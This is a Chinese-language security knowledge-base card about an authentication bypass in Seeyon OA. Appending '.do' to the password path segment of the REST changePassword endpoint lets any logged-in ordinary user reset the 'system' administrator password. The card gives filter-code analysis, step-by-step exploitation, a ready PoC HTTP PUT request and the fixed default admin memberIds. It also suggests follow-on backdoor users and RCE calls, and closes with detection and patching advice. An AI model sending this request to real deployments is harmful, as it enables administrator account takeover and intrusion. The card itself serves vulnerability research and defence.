---
id: web-java-component-seeyon-rest-changepassword-dotdo-auth-bypass
title: 致远 OA REST 重置密码权限绕过：密码段追加 .do 让 /seeyon/rest/... 走 SpringController 会话校验，普通用户重置管理员密码
type: scenario
domain: web
path: web/java/component
technique: seeyon-rest-changepassword-dotdo-auth-bypass
tags:
- java
- seeyon
- oa
- rest
- jersey
- auth-bypass
- password-reset
- path-confusion
- session
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 致远 V7.1SP1（原文复现环境）；官方补丁适配 V5/G6/N V6.0 至 V8.2 版本及 G6N4.0、N5.0；8.2 之后版本修复
verification:
  verified_by: verifier-V533
  verified_at: '2026-11-11T17:28:45+08:00'
  notes: 已对照原文与18张截图逐张核对：图01官方补丁页（编号230200-S013，2023年8月）明确适配版本范围为V5/G6/N V6.0至V8.2及G6N4.0、N5.0，已据此用set-versions修正原稿（原写V5/V6/V8.0至V8.2不准确），并保留原文复现环境V7.1SP1与8.2之后修复；图02补丁包ResourceCheckRoleAccessFilter、图04 checkRoleAccessInfo.properties中MemberResource#changePassword仅授权管理员角色、图05/06 changePassword @PUT @Path({id}/password/{password})与setPassword、图07 org_principal默认账号memberId（system=-7273032013234748168等）与文中一致；图08-10 CTPSecurityFilter先isSpringController后isRest、RestAuthenticator的sessionUserBlacklist、isRest=startsWith(/seeyon/rest/)；图11开放平台token POST /seeyon/rest/token JSON流程与token实例；图12/13创建REST用户并GET取token；图14带token正常改密成功；图16 isSpringController=endsWith(.do)或indexOf(.do;jessionid=)>0；图17普通用户JSESSIONID直接PUT .../password/123456.do成功返回successMsgs与系统管理员信息；图18 8.2修复为endsWith(.do)&&!isRest及分号扩展名同样排除REST。dedup：仅自身exact，aiedoc/xrdcontroller/autoinstall均非同链，thirdpartycontroller卡为不同链；dup-scan无涉及pair。versions_set=1。未在真实目标执行请求。
url: /docs/web/java/component/web-java-component-seeyon-rest-changepassword-dotdo-auth-bypass/
draft: false
kb_aliases:
- 致远OA rest接口重置密码
- changePassword 权限绕过
- orgMember password .do
- CTPSecurityFilter 绕过
- isSpringController isRest
- 致远 V7.1SP1 重置密码
---

## 一句话结论

致远 OA 的 REST 接口 `/seeyon/rest/orgMember/{memberId}/password/{password}`（`MemberResource.changePassword`，PUT）本应只接受 REST token 认证；但 `CTPSecurityFilter.doFilter` 先判断 `isSpringController(uri)` 再判断 `isRest(uri)`，而 `isSpringController` 只看 URI 是否以 `.do` 结尾（或含 `.do;jessionid=`）。攻击者把密码段写成 `123456.do`，整个 URI 就以 `.do` 结尾，被当作 SpringController 请求交给基于 session 的 `SpringControllerAuthenticator` 校验；任意已登录的普通用户用会话即可调用该 REST 接口，把 `system` 等管理员（memberId `-7273032013234748168`）的密码重置为自己指定的值，随后以管理员登录。

## 原理

- **REST 接口与权限设计**：致远用 Jersey 实现 REST（`web.xml` 中 `rest` servlet + `jersey.config.server.provider.classnames`），补丁在资源类前加了 `ResourceCheckRoleAccessFilter`，通过 `RestCheckRoleAccessManagerImpl.checkRole` 与 `checkRoleAccessInfo.properties` 校验“用户角色是否有权访问该方法”。`MemberResource.changePassword` 的路径为 `@PUT @Path("{id}/password/{password}")`，方法内 `orgManager.getMemberById(id)` 后直接 `member.getV3xOrgPrincipal().setPassword(password)` 并更新用户。
- **正常认证流程**：`CTPSecurityFilter` 对 `/seeyon/rest/` 前缀的请求调用 `RestAuthenticator.authenticate`，只接受 token（`sessionUserBlacklist` 会拦截 session 访问）；token 只能由管理员创建 REST 用户后通过 `/seeyon/rest/token/{restUserName}/{password}` 获取（POST JSON `{"userName":"rest","password":"..."}`）。因此按正常流程修改密码需要一个管理员账号来创建 REST 用户。
- **过滤器分支顺序**：`doFilter` 中：
  ```java
  if (this.isSpringController(uri, req)) {
      authenticator = this.controllerAuthenticator;   // 基于 session
  } else if (this.isRest(uri, req)) {
      authenticator = this.restAuthenticator;         // 只接受 token
  } ...
  ```
  `isRest` 判断 `uri.startsWith("/seeyon/rest/")`；`isSpringController` 判断 `uri.endsWith(".do")` 或 `uri.indexOf(".do;jessionid=") > 0`。二者并非互斥，`/seeyon/rest/...` 的 URI 只要以 `.do` 结尾，就会先命中 SpringController 分支。
- **路径参数可控**：`changePassword` 的 `{password}` 位于 URI 末尾，是完全可控的路径参数。把密码写成 `123456.do`，实际请求为 `/seeyon/rest/orgMember/-7273032013234748168/password/123456.do`，URI 以 `.do` 结尾 → `isSpringController` 为真 → 使用普通用户的 session 通过认证；Jersey 仍把该路径解析到 `changePassword` 资源，从而完成密码修改。加 `;jessionid=`（原文拼写）也能触发同一分支。
- **危害**：任意已登录的普通用户（甚至低权限账号）无需 token、无需管理员权限即可重置管理员密码。致远的默认账号 memberId 固定：`seeyon-guest -6964000252392685202`、`system -7273032013234748168`、`audit-admin -4401606663639775639`、`group-admin 5725175934914479521`；攻击者改掉 `system` 密码后直接以系统管理员登录，再结合后台接口（授权给普通用户后调用 RCE 接口、创建后门用户等）扩大利用。
- **修复原理**：8.2 之后 `isSpringController` 改为 `uri.endsWith(".do") && !isRest(uri, request)`，并在分号扩展名处理里同样排除 REST 路径，使 REST 请求不能再借 SpringController 的 session 校验分支。

## 触发条件

- 目标为存在该缺陷的致远版本（原文复现 V7.1SP1；官方补丁适配 V5/V6/V8.0 至 V8.2 等）。
- 攻击者拥有任意一个可登录的普通用户账号（或通过其它漏洞拿到普通用户会话）。
- `/seeyon/rest/` 接口可从攻击者网络访问，未被网关完全阻断。
- 目标存在默认管理员账号或已知 memberId；未打 8.2+ 修复补丁。

## 利用步骤

1. 以普通用户登录致远 OA，获取有效 `JSESSIONID`（也可用其它方式拿到普通用户会话）。
2. 构造 `PUT /seeyon/rest/orgMember/-7273032013234748168/password/123456.do`，只带普通用户 `JSESSIONID`，不带 REST token。
3. 观察响应：成功时返回用户信息（如 `name: 系统管理员`），说明密码已被修改；若返回 401/权限错误，尝试 `.do;jessionid=` 变体或换 memberId。
4. 用 `system` / 新密码登录后台，确认管理员权限。
5. 以管理员身份创建 REST 用户/后门用户、给普通用户赋权后调用后台 RCE 接口，或直接操作后台功能扩大利用。

## PoC

会话绕过（原文成功请求）：

```http
PUT /seeyon/rest/orgMember/-7273032013234748168/password/123456.do HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: JSESSIONID=<普通用户会话>; loginPageURL=; avatarImageUrl=
Connection: close
```

响应中出现 `"successMsgs"` 与 `"name":"系统管理员"` 即修改成功；随后用 `system/123456` 登录。

正常 token 流程（对照）：

```http
POST /seeyon/rest/token HTTP/1.1
Host: target
Content-Type: application/json
{"userName":"rest","password":"123456"}
```

```http
PUT /seeyon/rest/orgMember/-7273032013234748168/password/123456 HTTP/1.1
Host: target
token: c245a05d-b39f-40a1-959f-4f75de779e62
```

默认账号 memberId：

```text
seeyon-guest  -6964000252392685202
system        -7273032013234748168
audit-admin   -4401606663639775639
group-admin   5725175934914479521
```

## 变体与关联

- 关联：致远 thirdpartyController.do 的 enc 任意用户登录见 `web-java-component-seeyon-thirdpartycontroller-enc-arbitrary-user-login`；拿到任意用户会话后可直接衔接本卡的 REST 改密绕过。
- 关联：致远 autoinstall 登录 locale zip 路径穿越、xrdController 文件复制穿越等后台链见 `web-java-component-seeyon-autoinstall-login-locale-zip-traversal`、`web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal`。
- 变体：`.do;jessionid=` 等分号扩展名写法可触发同一 `isSpringController` 分支；REST 路径中其它以 `{参数}` 结尾的接口同样可能被该后缀混淆影响。
- 边界：8.2+ 已修复；不同小版本的 URI 解析（Jersey 对 `.do` 的处理、密码落库值是否包含 `.do`）可能不同，登录时可按 `123456`/`123456.do` 两种值尝试。

## 检测与防御

- 修复：升级到致远 8.2+ 或安装官方“rest接口重置密码漏洞补丁”；确认 `isSpringController` 对 `/seeyon/rest/` 路径返回 false。
- 加固：网关/WAF 对 `/seeyon/rest/` 强制 token 认证，拒绝 session Cookie 访问；禁止 REST 路径中出现 `.do` 后缀/分号扩展名；默认管理员账号改名、强密码、限制登录来源。
- 检测：`PUT /seeyon/rest/orgMember/*/password/*.do`、`*.do;jessionid=` 等异常 URI；同一 `JSESSIONID` 从普通用户变更为管理员；管理员密码短时间被修改；REST 接口使用 Cookie 而非 token 的请求。
- 审计：记录密码重置操作的操作者、目标 memberId 与来源 IP；对默认管理员 memberId 的改密/登录告警。
